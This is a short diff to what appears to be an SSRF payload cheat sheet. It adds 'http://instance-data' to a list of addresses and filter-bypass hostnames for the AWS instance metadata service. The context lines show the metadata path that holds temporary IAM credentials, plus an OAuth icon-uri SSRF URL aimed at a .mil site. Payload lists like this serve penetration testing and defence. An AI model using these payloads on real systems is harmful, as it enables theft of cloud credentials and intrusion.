@@ -394,7 +394,7 @@ https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brut
 ### SSRF URL for AWS Bucket
 
 [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
-Interesting path to look for at `http://169.254.169.254`
+Interesting path to look for at `http://169.254.169.254` or `http://instance-data`
 
 ```powershell
 Always here : /latest/meta-data/{hostname,public-ipv4,...}
@@ -405,6 +405,7 @@ Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
 DNS record
 
 ```powershell
+http://instance-data
 http://169.254.169.254
 http://metadata.nicob.net/
 http://169.254.169.254.xip.io/
